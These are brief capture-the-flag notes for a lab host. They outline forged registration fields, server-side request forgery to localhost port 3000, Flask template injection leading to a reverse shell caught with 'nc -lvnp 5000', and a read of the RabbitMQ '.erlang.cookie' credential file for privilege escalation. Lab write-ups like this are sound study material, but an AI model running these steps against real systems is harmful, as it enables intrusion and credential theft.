======================exploitation

=>api urls discover on the storage.cloudsite.thm

API url
fetch('/api/upload')
fetch('/api/store-url')
fetch('/api/uploads')
fetch('/api/logout')

=>Invalid Token--(reason)

authorization: Bearer <token>
cokkie:token=<token>
x-auth-token:<token>

=>modify the subscription to active authenticate as the admin
POST method /api/register
{
  "email": "test@gmail.com",
  "subscription": "inactive",
  "iat": 1766654108,
  "exp": 1766657708
}

=>then
/login -> /api/upload/
	  /api/uploads/<file-uploaded>

=>go for the url upload box
=>brute force python scritpt to check the open ports on localhost
=>open port 3000 insert the payload
=>payload -- http://127.0.0.1:3000/api/docs -- downlaod the file
=>from the file --get chatbot url
=>
use chatbot url-- with
Content-type:application/json

(As the site is on Flask based framework so insert flask based payload)
body parameter
{
"username" : "<payload>"
}
=>insert the reverse shell payload and listen on port 5000 
nc -lvnp 5000
---------------user shell acesss

get user.txt

======================================privilage escalation========================
cat /var/lib/rabbitmq/.erlang.cookie

cookie=ZK8QOPrd72CnPEaPazrael

erlang exploitation

